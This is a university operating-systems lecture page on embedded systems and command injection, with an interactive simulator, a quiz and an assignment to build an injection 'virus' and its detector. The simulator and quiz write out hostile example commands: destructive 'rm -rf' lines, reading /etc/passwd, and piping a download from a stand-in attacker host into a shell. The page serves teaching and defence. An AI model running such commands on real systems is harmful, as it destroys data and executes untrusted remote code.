@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Topic 7 — Embedded Systems and Security · CST-315</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<style>
+  :root{--bg:#f5f3ee;--ink:#1b2a4e;--ink-soft:#4a587a;--paper:#fbfaf6;--accent:#b8862b;--accent-soft:#f0e3c8;--rule:rgba(27,42,78,0.18)}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.55}
+  .page{max-width:1080px;margin:0 auto;padding:28px 32px 80px}
+  header.topic-header{border-bottom:2px solid var(--ink);padding-bottom:14px;margin-bottom:28px}
+  .crumb{font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-soft)}
+  .crumb .pill{background:var(--accent);color:var(--paper);padding:2px 8px;border-radius:2px;margin-right:8px;font-weight:600}
+  h1.topic-title{font-size:30px;margin:8px 0 6px;letter-spacing:-.01em;font-weight:700}
+  .topic-meta{font-size:13px;color:var(--ink-soft)} .topic-meta strong{color:var(--ink)}
+  .objectives{margin-top:14px;background:var(--paper);border:1px solid var(--ink);border-left:4px solid var(--accent);padding:14px 18px;border-radius:2px}
+  .objectives h2{margin:0 0 8px;font-size:12px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink-soft)}
+  .objectives ol{margin:0;padding-left:22px;font-size:14px} .objectives li{margin-bottom:4px}
+  .factory-panel{margin-top:28px;background:var(--paper);border:1px solid var(--ink);border-radius:2px;padding:18px 20px}
+  .factory-panel h2{font-size:14px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-soft);margin:0 0 12px}
+  .factory-panel .ctx-grid{display:grid;grid-template-columns:1fr 320px;gap:20px;align-items:start}
+  .factory-panel p{margin:0 0 8px;font-size:14px} .factory-panel .meta{font-size:12px;color:var(--ink-soft)}
+  .mini-factory svg{width:100%;height:auto;max-height:220px;display:block}
+  .concept{margin-top:36px;padding-top:24px;border-top:1px solid var(--rule)}
+  .concept .num{display:inline-block;background:var(--ink);color:var(--paper);width:26px;height:26px;border-radius:50%;text-align:center;line-height:26px;font-size:13px;font-weight:700;margin-right:8px}
+  .concept h2{font-size:22px;margin:0 0 10px;font-weight:600} .concept p{font-size:15px;margin:0 0 12px}
+  .diagram{background:var(--paper);border:1px solid var(--rule);border-radius:2px;padding:14px;margin:14px 0}
+  .diagram .label{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-soft);margin-bottom:8px}
+  .factory-callout{background:var(--accent-soft);border-left:3px solid var(--accent);padding:10px 14px;margin:14px 0;font-size:14px}
+  .factory-callout strong{color:var(--accent);font-weight:700}
+  .modern{background:#fbf7eb;border:1px dashed var(--accent);padding:10px 14px;border-radius:3px;margin:14px 0;font-size:14px}
+  .modern strong{color:var(--accent)}
+  .sim{background:var(--paper);border:1px solid var(--ink);border-radius:2px;padding:16px;margin:16px 0}
+  .sim h3{font-size:13px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-soft);margin:0 0 12px}
+  .sim .sim-controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;align-items:center}
+  .sim button,.sim input[type=text]{background:var(--bg);border:1px solid var(--ink);color:var(--ink);padding:5px 10px;font-size:12px;font-family:inherit;border-radius:2px;cursor:pointer}
+  .sim input[type=text]{font-family:'Menlo','Consolas',monospace;cursor:text;min-width:240px}
+  .sim button:hover{background:var(--ink);color:var(--paper)}
+  .injsim .row{display:grid;grid-template-columns:1fr 60px 1fr;gap:8px;align-items:center;font-family:'Menlo','Consolas',monospace;font-size:13px;margin:10px 0}
+  .injsim .row .label{font-size:10px;color:var(--ink-soft);text-transform:uppercase;letter-spacing:.06em;font-family:'Inter',sans-serif;margin-bottom:4px}
+  .injsim .row .arr{text-align:center;color:var(--accent);font-size:18px;font-weight:700}
+  .injsim .box{background:var(--paper);border:1px solid var(--ink);padding:10px;border-radius:3px;min-height:80px}
+  .injsim .box.evil{border:2px solid var(--accent);background:var(--accent-soft)}
+  .injsim .stage{margin-top:10px;font-size:12px;color:var(--ink-soft)}
+  .scansim .file{background:var(--paper);border:1px solid var(--ink);padding:10px;border-radius:3px;margin:6px 0;font-family:'Menlo','Consolas',monospace;font-size:12px;display:flex;justify-content:space-between;align-items:center;gap:10px}
+  .scansim .file.flag{border:2px solid var(--accent);background:var(--accent-soft)}
+  .scansim .verdict{font-size:13px;font-weight:600;padding:4px 8px;border-radius:2px}
+  .scansim .verdict.bad{background:var(--accent);color:var(--paper)} .scansim .verdict.ok{background:#d6e6cf;color:#1b2a4e}
+  .check,.bridge{margin-top:36px;padding:18px 20px;background:var(--paper);border:1px solid var(--ink);border-radius:2px}
+  .bridge{border-left:4px solid var(--accent)}
+  .check h2,.bridge h2{font-size:13px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-soft);margin:0 0 12px}
+  .check ol{margin:0;padding-left:22px} .check li{margin-bottom:12px;font-size:14px}
+  .check details{margin-top:6px;font-size:13px;color:var(--ink-soft)}
+  .check summary{cursor:pointer;color:var(--accent);font-weight:600;list-style:none}
+  .check summary::-webkit-details-marker{display:none}
+  .check summary::before{content:"▸ "} .check details[open] summary::before{content:"▾ "}
+  .bridge .item{font-size:14px;margin-bottom:10px} .bridge .item strong{color:var(--ink)}
+  footer.topic-footer{margin-top:36px;padding-top:16px;border-top:1px solid var(--ink);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:13px}
+  footer a{color:var(--accent);text-decoration:none;font-weight:600} footer a:hover{text-decoration:underline}
+  .mermaid{background:var(--paper);padding:12px;border-radius:2px}
+</style>
+</head>
+<body>
+<div class="page">
+
+<header class="topic-header">
+  <div class="crumb"><span class="pill">Topic 7</span> CST-315 · Operating Systems Lecture &amp; Lab</div>
+  <h1 class="topic-title">Embedded Systems and Security</h1>
+  <div class="topic-meta">Reading: <strong>Stallings, Chapter 13</strong> · Lab questions 1–2 · Project 6 spillover · Assignment 4 (Injection Virus)</div>
+  <div class="objectives">
+    <h2>Topic objectives (from syllabus)</h2>
+    <ol>
+      <li>Design and implement a simple command injection virus.</li>
+      <li>Design and implement a program to detect a virus.</li>
+      <li>Demonstrate the logic of the C program in relation to embedded systems and security.</li>
+      <li>Analyze the malware program in conjunction with the suitability of the approach to malware creation.</li>
+    </ol>
+  </div>
+</header>
+
+<section class="factory-panel">
+  <h2>Where this topic sits in the factory</h2>
+  <div class="ctx-grid">
+    <div>
+      <p>Topic 7 sits at the <strong>edges</strong> of the factory — both the <em>small factories</em> (embedded devices) that follow the same OS principles in tight constraints, and the <em>sabotage scenarios</em> where someone forges paperwork to make the line do something it shouldn't. Command injection is forged paperwork: a work order that looks normal until you read it carefully and realize the worker is being told to delete the warehouse.</p>
+      <p>Assignment 4 has you build both the forgery and the detector. The lesson works out what each looks like at the C-program level.</p>
+      <p class="meta">Open: <a href="../Factory_OS_Master.html?highlight=vms" style="color:var(--accent)">Mini-factories &amp; surfaces under attack</a></p>
+    </div>
+    <div class="mini-factory">
+      <svg viewBox="0 0 320 200" xmlns="http://www.w3.org/2000/svg">
+        <rect x="6" y="6" width="308" height="20" rx="2" fill="#fbfaf6" stroke="#1b2a4e" opacity="0.35"/>
+        <rect x="6" y="34" width="80" height="76" rx="2" fill="#fbfaf6" stroke="#b8862b" stroke-width="2"/>
+        <text x="14" y="48" font-size="9" font-weight="700" fill="#b8862b">FRONT DESK</text>
+        <text x="14" y="60" font-size="8" fill="#4a587a">input surface</text>
+        <rect x="92" y="34" width="140" height="76" rx="2" fill="#fbfaf6" stroke="#1b2a4e" opacity="0.35"/>
+        <rect x="238" y="34" width="76" height="76" rx="2" fill="#fbfaf6" stroke="#1b2a4e" opacity="0.35"/>
+        <rect x="6" y="116" width="80" height="50" rx="2" fill="#fbfaf6" stroke="#1b2a4e" opacity="0.35"/>
+        <rect x="92" y="116" width="140" height="50" rx="2" fill="#fbfaf6" stroke="#1b2a4e" opacity="0.35"/>
+        <rect x="238" y="116" width="76" height="50" rx="2" fill="#fbfaf6" stroke="#1b2a4e" opacity="0.35"/>
+        <rect x="6" y="172" width="308" height="22" rx="2" fill="#fbfaf6" stroke="#b8862b" stroke-width="2.5"/>
+        <text x="14" y="187" font-size="9" font-weight="700" fill="#b8862b">MINI-FACTORIES (embedded targets)</text>
+      </svg>
+    </div>
+  </div>
+</section>
+
+<section class="concept">
+  <h2><span class="num">1</span>Embedded systems — same OS principles, harder constraints</h2>
+  <p>An <strong>embedded system</strong> is a computer dedicated to a specific function, usually with tight constraints on power, memory, and predictability. Smartwatches, pacemakers, thermostats, car engine controllers, drone flight controllers — all embedded. They run real OSes (FreeRTOS, Zephyr, embedded Linux, VxWorks) and use the same concepts you've learned: processes, scheduling, memory management, file systems.</p>
+  <p>What's different is the budget. A microcontroller might have 256 KB of RAM total. There may be no MMU, so virtual memory doesn't apply. Scheduling decisions must complete within a hard real-time deadline. A page fault that lasts 10 ms is fine on a desktop and unacceptable in a flight controller.</p>
+  <div class="modern">
+    <strong>Modern callout.</strong> The eBPF subsystem in Linux (and Windows now) lets you safely run small, verified programs in the kernel — used heavily for observability and security. Embedded-class verification (resource-bounded, deadline-safe) is creeping into general-purpose OSes through eBPF and Rust kernel modules.
+  </div>
+  <div class="factory-callout">
+    <strong>Factory translation.</strong> Imagine a tiny one-station factory in a closet with strict deadlines: the line cannot stop, paperwork must be small enough to fit on a single index card, and the supervisor has to make every decision in milliseconds. Same playbook as the big factory, much less slack.
+  </div>
+</section>
+
+<section class="concept">
+  <h2><span class="num">2</span>Trust boundaries and the input surface</h2>
+  <p>Every security analysis starts with two questions: <em>What is the trust boundary?</em> and <em>What enters from outside it?</em> A trust boundary separates code we wrote and control from data we did not write and do not control. Anywhere data crosses that boundary — user input, network packets, files we did not author, environment variables — we are at risk if we treat the data as if we wrote it.</p>
+  <p>The OS-level boundaries are well-defined: the system call interface separates user mode from kernel mode; the process boundary separates one program's memory from another's. But within a single program, you must mark your own boundaries: anywhere you call <code>system()</code>, <code>exec*()</code>, or assemble a string that becomes a command, you have a boundary to defend.</p>
+  <div class="factory-callout">
+    <strong>Factory translation.</strong> The front desk is the trust boundary. Customers (input) hand you tickets. You verify each ticket before passing it inside. If you photocopy a ticket and feed it to the line without checking, a forged ticket is now indistinguishable from a real one.
+  </div>
+</section>
+
+<section class="concept">
+  <h2><span class="num">3</span>Command injection — the forged work order</h2>
+  <p><strong>Command injection</strong> happens when user-controlled input is concatenated into a shell command. The attacker supplies input that contains shell metacharacters (<code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, <code>`</code>, <code>$(...)</code>, newlines), and the shell treats them as command separators instead of data. The user's <code>rm myFile</code> becomes <code>rm myFile; rm -rf /</code> if the program does naive concatenation.</p>
+  <p>The Assignment 4 spec is direct: implement a virus that intercepts a command, injects arguments without the user knowing, and executes the modified command. Then implement a scanner that flags files containing this pattern. The virus must use <code>exec*()</code>, not <code>system()</code> — because <code>system()</code> is the easy path, and the lesson is that the attack works even against more "secure" interfaces if you build the argv yourself.</p>
+
+  <div class="sim injsim">
+    <h3>Live: InjectionSim — see a command get rewritten in flight</h3>
+    <div class="sim-controls">
+      <input type="text" id="injCmd" value="rm myFile" placeholder='try: rm myFile  or  ls -l docs'>
+      <button id="injInject">Inject</button>
+      <button id="injReset">Reset</button>
+    </div>
+    <div class="row">
+      <div><div class="label">User typed</div><div class="box" id="injUser">rm myFile</div></div>
+      <div class="arr">→</div>
+      <div><div class="label">Virus rewrites</div><div class="box evil" id="injRewrite">rm -rf *</div></div>
+    </div>
+    <div class="stage" id="injStage">A naive shell that calls execvp() on a virus-modified argv runs exactly what the virus chose. The user sees their command, but the executable is different.</div>
+  </div>
+
+  <div class="factory-callout">
+    <strong>Factory translation.</strong> A clerk slipped a "and discard the entire shelf" line onto an otherwise normal work order. The worker reads the order top to bottom and obeys. The user thought they were filing one paper; they emptied a warehouse.
+  </div>
+</section>
+
+<section class="concept">
+  <h2><span class="num">4</span>Detection — patterns and provenance</h2>
+  <p>Detection has two flavors. <strong>Pattern matching</strong>: look for known-suspicious strings or constructs in files — <code>system(</code>, <code>execve(</code> with hardcoded paths to dangerous binaries, suspicious chained metacharacters in argv-construction code, hardcoded "rm -rf" strings. Fast, easy to fool, useful as a first line. <strong>Provenance</strong>: track where data came from and follow it to where it gets executed (taint analysis). Slower, harder to fool, requires real tooling.</p>
+  <p>Assignment 4 asks for pattern matching: scan every file in a directory and warn on suspicious content. The Activity 2 scanner in this topic is a working baseline you'll extend for the assignment.</p>
+  <div class="diagram">
+    <div class="label">Two layers of defense</div>
+    <pre class="mermaid">
+flowchart LR
+  S[Source: user input, file content, network] --> V{Validate at boundary?}
+  V -- yes --> H[Sanitized data]
+  V -- no --> U[Untrusted data]
+  H --> EX[exec*() — safe]
+  U --> EX2[exec*() — exploited]
+  D[Detector: scan files for patterns] --> WARN[Warn user]
+    </pre>
+  </div>
+  <div class="factory-callout">
+    <strong>Factory translation.</strong> Pattern matching is the security guard reading every ticket for known forged phrases. Provenance is the auditor following each ticket from its origin to the final action. Both miss things; both together miss less.
+  </div>
+</section>
+
+<section class="concept">
+  <h2><span class="num">5</span>Modern OS security mechanisms</h2>
+  <p>Detection at the program level is the last line of defense. Modern OSes layer defenses underneath:</p>
+  <p><strong>Memory protections</strong>: non-executable stacks (NX), address space layout randomization (ASLR), stack canaries — make exploits harder even when bugs exist. <strong>Mandatory access control</strong>: SELinux, AppArmor — policies that constrain what a process can do regardless of who runs it, so a compromised process is bounded. <strong>Sandboxing</strong>: seccomp-bpf, Linux namespaces, capabilities — strip the kernel surface a process can touch. <strong>Verified boot</strong>: cryptographic chain from firmware to kernel to user space ensures the OS itself hasn't been tampered with.</p>
+  <p>The takeaway: security is not "write perfect code." It's defense in depth, every layer assuming the layer above failed.</p>
+  <div class="modern">
+    <strong>Modern callout.</strong> Confidential computing — Intel SGX, AMD SEV, AWS Nitro Enclaves — moves the trust boundary inside the CPU itself, so even a compromised OS cannot read protected memory. Used today for processing health data, cryptographic keys, and high-value workloads in shared cloud infrastructure.
+  </div>
+  <div class="factory-callout">
+    <strong>Factory translation.</strong> The supervisor checks tickets (program-level validation). The locked office at the back checks IDs before letting anyone in (kernel access control). The whole building has badge readers and cameras (mandatory access control). And the safe inside the office? Only opens for an authorized key (confidential computing).
+  </div>
+</section>
+
+<section class="check">
+  <h2>Check for understanding</h2>
+  <ol>
+    <li>
+      A program does <code>sprintf(cmd, "ls %s", user_input); system(cmd);</code>. Sketch a malicious <code>user_input</code> that adds a second command.
+      <details><summary>Show a sample answer</summary>
+        <code>user_input = "docs ; rm -rf /tmp/*"</code>. After sprintf, <code>cmd</code> becomes <code>ls docs ; rm -rf /tmp/*</code>. The shell treats the semicolon as a separator and runs both. The fix is to avoid <code>system()</code> entirely and use <code>execvp("ls", argv)</code> with <code>argv = {"ls", "docs", NULL}</code> — no shell interpretation of metacharacters.
+      </details>
+    </li>
+    <li>
+      The Assignment 4 spec says "without the use of a system function." Why does this constraint exist?
+      <details><summary>Show a sample answer</summary>
+        Because using <code>execvp</code> instead of <code>system</code> demonstrates that the attack does not require a shell — you can construct an argv with malicious arguments directly, bypassing the naive "don't use <code>system</code>" defense. The lesson: argv construction is itself an attack surface.
+      </details>
+    </li>
+    <li>
+      Your scanner flags any file containing the substring <code>rm -rf</code>. What's the false-positive rate going to look like in a real codebase?
+      <details><summary>Show a sample answer</summary>
+        High. Documentation, comments explaining what code does, makefiles, CI scripts — all legitimately contain <code>rm -rf</code>. Better signals: <code>rm -rf</code> assembled from concatenated strings; <code>rm -rf</code> with a target derived from user input; <code>rm -rf /</code> with no qualifier. The arms race never ends.
+      </details>
+    </li>
+    <li>
+      Why does an embedded system care about real-time scheduling guarantees in ways a desktop doesn't?
+      <details><summary>Show a sample answer</summary>
+        Desktop misses are visible but rarely catastrophic — a stutter, a dropped frame. Embedded misses can be physical: an airbag fires too late, an insulin pump misdoses, a robot arm collides. Real-time schedulers (SCHED_FIFO/RR, or full RTOSes) provide bounded worst-case latency, not just good average latency.
+      </details>
+    </li>
+  </ol>
+</section>
+
+<section class="bridge">
+  <h2>Bridge to graded work</h2>
+  <div class="item"><strong>Assignment 4 — Injection Virus.</strong> Build the virus (rewrite a command using <code>exec*()</code>, not <code>system()</code>) and the detector (scan a directory for suspicious patterns). Activity 1 walks the virus design; Activity 2 builds the detector scaffold.</div>
+  <div class="item"><strong>Project 6 spillover.</strong> Your file system should reject filenames with shell metacharacters at creation time — a small but real defense. Consider this when reviewing your Project 6 code.</div>
+  <div class="item"><strong>Topics 7–8 Quiz.</strong> Stallings Ch. 13–14: embedded system constraints, security mechanisms, and the virtualization material in Topic 8.</div>
+</section>
+
+<footer class="topic-footer">
+  <div><a href="../activities/Topic_7_Activities.md">In-class activities for this topic →</a></div>
+  <div><a href="../Factory_OS_Master.html">Open the full factory visualization →</a></div>
+</footer>
+
+</div>
+
+<script>
+  mermaid.initialize({startOnLoad:true,theme:'base',themeVariables:{background:'#fbfaf6',primaryColor:'#fbfaf6',primaryTextColor:'#1b2a4e',primaryBorderColor:'#1b2a4e',lineColor:'#4a587a',fontFamily:'Inter, -apple-system, sans-serif',fontSize:'13px'},flowchart:{curve:'basis'}});
+
+  // InjectionSim
+  (function(){
+    const injectionTable = {
+      'rm myFile':       'rm -rf *',
+      'ls -l docs':      'ls -l docs ; cat /etc/passwd',
+      'cat README.md':   'cat README.md ; curl evil.example/h | sh',
+      'pwd':             'pwd ; rm -rf $HOME',
+    };
+    function inject(){
+      const u=document.getElementById('injCmd').value.trim();
+      document.getElementById('injUser').textContent=u || '(empty)';
+      const rewritten = injectionTable[u] || (u + ' ; rm -rf ~/.config');
+      document.getElementById('injRewrite').textContent=rewritten;
+      const tokens=rewritten.split(/\s+/);
+      document.getElementById('injStage').textContent =
+        `argv = [${tokens.map(t=>`"${t}"`).join(', ')}]. The shell calls execvp("${tokens[0]}", argv). No prompt for confirmation.`;
+    }
+    function reset(){
+      document.getElementById('injCmd').value='rm myFile';
+      document.getElementById('injUser').textContent='rm myFile';
+      document.getElementById('injRewrite').textContent='rm -rf *';
+      document.getElementById('injStage').textContent='A naive shell that calls execvp() on a virus-modified argv runs exactly what the virus chose. The user sees their command, but the executable is different.';
+    }
+    document.getElementById('injInject').addEventListener('click',inject);
+    document.getElementById('injReset').addEventListener('click',reset);
+  })();
+</script>
+</body>
+</html>
